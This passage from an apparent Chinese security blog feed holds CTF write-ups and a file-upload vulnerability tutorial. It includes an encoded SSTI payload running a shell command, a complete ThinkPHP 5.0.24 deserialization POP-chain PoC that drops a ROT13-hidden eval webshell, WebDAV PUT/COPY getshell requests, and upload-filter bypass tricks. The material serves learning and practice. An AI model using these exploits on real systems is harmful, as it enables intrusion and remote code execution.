class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,103,103,103,103,103,103,103,103,39,41,46,114,101,97,100,40,41))&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EZ-thinkphp"><a href="#EZ-thinkphp" class="headerlink" title="EZ_thinkphp"></a>EZ_thinkphp</h3><p>扫描目录，发现源码</p><p><img src="https://i.loli.net/2020/12/26/S9rz6TGBYxalcdC.png" alt="image-20201226123828906"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// www\source\application\index\controller\index.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $a=@unserialize(base64_decode(<span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;a&#x27;</span>)));<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;thinkphp 5.0.24&#x27;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">// 利用点 </span><br></code></pre></td></tr></table></figure><p><a href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">参考文章</a>  直接白嫖poc :airplane:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs php">poc<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;<br><span class="hljs-keyword">private</span> $files = [];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> Pivot()];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-comment">#Relation</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span>&#123;<br><span class="hljs-keyword">protected</span> $selfRelation;<br><span class="hljs-keyword">protected</span> $query;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<span class="hljs-comment">#class Query</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>;<span class="hljs-comment">#OneToOne HasOne</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::__construct();<br>&#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span>&#123;<br><span class="hljs-keyword">protected</span> $bindAttr = [];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::__construct();<br><span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&quot;no&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>;<span class="hljs-comment">#Output</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span>&#123;<br><span class="hljs-keyword">private</span> $handle = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> $styles = [];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> Memcached();<span class="hljs-comment">//目的调用其write()</span><br><span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<span class="hljs-comment">#Model</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>\<span class="hljs-title">HasOne</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br><span class="hljs-keyword">protected</span> $append = [];<br><span class="hljs-keyword">protected</span> $error;<br><span class="hljs-keyword">public</span> $parent;<span class="hljs-comment">#修改处</span><br><span class="hljs-keyword">protected</span> $selfRelation;<br><span class="hljs-keyword">protected</span> $query;<br><span class="hljs-keyword">protected</span> $aaaaa;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-keyword">new</span> Output();<span class="hljs-comment">#Output对象,目的是调用__call()</span><br><span class="hljs-keyword">$this</span>-&gt;append = [<span class="hljs-string">&#x27;getError&#x27;</span>];<br><span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-keyword">new</span> HasOne();<span class="hljs-comment">//Relation子类,且有getBindAttr()</span><br><span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<span class="hljs-comment">//isSelfRelation()</span><br><span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>;<span class="hljs-comment">#Query</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>&#123;<br><span class="hljs-keyword">protected</span> $model;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-keyword">new</span> Output();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#Memcached</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;<br><span class="hljs-keyword">protected</span> $handler = <span class="hljs-literal">null</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> File();<span class="hljs-comment">//目的调用File-&gt;set()</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#File</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br><span class="hljs-keyword">protected</span> $options = [];<br><span class="hljs-keyword">protected</span> $tag;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;options = [<br><span class="hljs-string">&#x27;expire&#x27;</span>        =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="hljs-literal">false</span>,<br><span class="hljs-string">&#x27;prefix&#x27;</span>        =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;path&#x27;</span>          =&gt; <span class="hljs-string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>];<br><span class="hljs-keyword">$this</span>-&gt;tag =<span class="hljs-string">&#x27;abcdef&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>&#125;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;<br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));<br><span class="hljs-comment">//在index.php页面传入值</span><br><span class="hljs-comment">// 文件的名字是：传入内容+md5(&#x27;tag_&#x27;+md5($tag)).php 并且部分需要urlcode转码</span><br><span class="hljs-comment">// &lt;%3fcuc cucvasb()%3briny($_TRG[pzq])%3b%3f&gt;468bc8d30505000a2d7d24702b2cda94.php</span><br></code></pre></td></tr></table></figure><p>执行命令即可</p><p><img src="https://i.loli.net/2020/12/26/xjLs3Upgi8ctJKY.png" alt="image-20201226140139525"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;&lt;em&gt;WEB&lt;/em&gt;&lt;/h2&gt;&lt;h3 id=&quot;EZ-JS&quot;&gt;&lt;a href=&quot;#EZ-JS&quot; class=&quot;headerlink&quot; title=&quot;EZ_JS&quot;&gt;&lt;/a&gt;EZ_JS&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png&quot; alt=&quot;image-20201224123233716&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png&quot; alt=&quot;image-20201224123259063&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里有个好用的颜码解码网站：&lt;a href=&quot;https://www.qtool.net/decode&quot;&gt;https://www.qtool.net/decode&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>文件上传基础</title>
    <link href="http://example.com/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2020/12/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/</id>
    <published>2020-12-27T15:08:24.000Z</published>
    <updated>2020-12-27T15:09:41.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><blockquote><p>不是涉及的版本不是最新版……</p></blockquote><a id="more"></a><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><blockquote><p>IIS 6.0</p></blockquote><ol><li><p>IIS中的*.asa *.asp 文件夹中的文件都会被当成asp文件解析</p></li><li><p>文件为*.asp;1.jpg时会被当成ASP脚本执行</p></li><li><p>WebDav</p><blockquote><p>它是基于HTTP 1.1 协议的通信协议，它扩展了HTTP协议，添加了新的方法</p><p>打开WebDav后支持PUT Move Copy Delete </p><p>IIS Write 是一款探测WebDav漏洞的软件 </p></blockquote><ul><li><p>使用 OPTIONS 查看支持的所有方法</p></li><li><p>通过PUT上传文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUT</span> /<span class="hljs-number">1</span>.txt HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>:www.example.com<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">30</span><br><br><span class="hljs-section">&lt;% …………%&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>使用Move 或 Copy 方法改名</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">COPY <span class="hljs-regexp">/1.txt HTTP/</span><span class="hljs-number">1.1</span><br><span class="hljs-attr">Host:</span>www.example.com<br><span class="hljs-attr">Destination:</span> <span class="hljs-attr">http:</span><span class="hljs-comment">//www.example.com/cmd.adp</span><br></code></pre></td></tr></table></figure></li><li><p>这样就能getshell</p></li><li><p>还可以使用Delete方法删除任意文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">DELETE</span> <span class="hljs-string">/1.txt</span> HTTP/1.1<br><span class="hljs-attribute">Host:www.example.com</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><blockquote><p>1.x  2.x</p></blockquote><p>Apache在解析文件时有一个原则：碰到不认识的扩展名时，会从后向前解析，知道碰到认识的扩展名为止</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">example</span>:<br>1<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.rar</span><span class="hljs-selector-class">.xs</span><span class="hljs-selector-class">.aa</span> 这时就会从后往前解析，直到遇到<span class="hljs-selector-class">.php</span><br></code></pre></td></tr></table></figure><h3 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP CGI"></a>PHP CGI</h3><blockquote><p>在php的配置文件中：cgi.fi: x_pathinfo 这个选项在某些版本中，默认是开启的，在访问URL时，如<code>www.example.com/1.txt/1.php</code></p><p>这时如果1.php不存在，则.php将会向前递归解析</p><p>该漏洞在Nginx IIS7.0  IIS7.5  Lighttpd 等web容器中容易出现</p></blockquote><p>主要利用方法就是上传合法文件名，然后进行非法解析</p><h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><ol><li><p>绕过前端javascript 过滤</p></li><li><p>绕过黑名单</p><blockquote><p>asp php  jsp  php5  asa  aspx </p></blockquote></li><li><p>修改MIME</p></li><li><p>截断上传</p><blockquote><p>将 1.asp空格xx.jpg 进入十六进制编辑器将空格的16进制数20修改为00，最后会发现上传到服务的文件变成了1.asp</p></blockquote></li><li><p>使用.htaccess   .user.ini  配置文件的绕过</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;解析漏洞&quot;&gt;&lt;a href=&quot;#解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;解析漏洞&quot;&gt;&lt;/a&gt;解析漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;不是涉及的版本不是最新版……&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="http://example.com/2020/12/21/GYCTF2020-Easyphp/"/>
    <id>http://example.com/2020/12/21/GYCTF2020-Easyphp/</id>
    <published>2020-12-21T15:33:58.000Z</published>
    <updated>2020-12-22T11:39:05.877Z</updated>
    
    <content type="html"><![CDATA[<p>考点：php序列化pop链   序列化字符串逃逸</p><blockquote><p>打开题目按照管理先扫描目录</p></blockquote><blockquote><p>使用dirsearch 扫描出来了  flag.php  login.php</p><p>使用御剑什么都没有扫出来</p><p>使用dirbuster什么都没有</p><p>这个貌似是BUU平台问题……</p></blockquote><p>打开题目</p><p><img src="https://i.loli.net/2020/12/19/vXSHu8nJyDhlE3q.png" alt="image-20201219105022481"></p><p>发现登录框，尝试弱口令登录，并且爆破用户名与密码，查看图片</p><blockquote><p>失败</p><p>查看大佬的wp，存在<a href="http://www.zip（没扫出来…………）">www.zip（没扫出来…………）</a></p></blockquote><p>查看<a href="http://www.zip,解压后查看代码/">www.zip，解压后查看代码</a></p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><br>$users=<span class="hljs-keyword">new</span> User(); <span class="hljs-comment">//创建类</span><br>$users-&gt;update(); <span class="hljs-comment">// 调用user类的update函数</span><br><span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> $flag;<br>&#125;<br> <br><span class="hljs-comment">// user类的update函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//调用了getNewinfo函数</span><br>    $Info=unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());<br>    $age=$Info-&gt;age;<br>    $nickname=$Info-&gt;nickname;<br>    <span class="hljs-comment">//定义了一个UpdateHelper类</span><br>    $updateAction=<span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>],$Info,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br><br><span class="hljs-comment">// 输入点 age 与 nickname 参数可控</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $age=$_POST[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        $nickname=$_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>    <span class="hljs-comment">//创建了一个Info类并且序列化使用safe过滤</span><br>        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age,$nickname)));<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span>&#123;<br>    $array= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> str_replace($array,<span class="hljs-string">&#x27;hacker&#x27;</span>,$parm);<br>&#125; <span class="hljs-comment">// 字符串替换</span><br><br><br><br><span class="hljs-comment">// Info 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $age;<br>    <span class="hljs-keyword">public</span> $nickname;<br>    <span class="hljs-keyword">public</span> $CtrlCase;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age,$nickname</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;age=$age;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname=$nickname;<br>    &#125;<br>    <span class="hljs-comment">// 在对象上下文中调用不可访问的方法时触发</span><br>    <span class="hljs-comment">// __call 中的参数，$name 需要调用的方法的名称，$arguments是一个数组，其中包含传递给方法$name的参数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name,$argument</span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);<br>        <span class="hljs-comment">//此处$argument[0]就为age</span><br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>这里如何触发__call()函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-comment">// user类 </span><br><span class="hljs-comment">// 把类当成字符串使用时触发，返回值需要为字符串</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br><br><span class="hljs-comment">// 这里user类中调用了Info类中不存在的update函数，因此这里会自动调用__call()函数</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbuser=<span 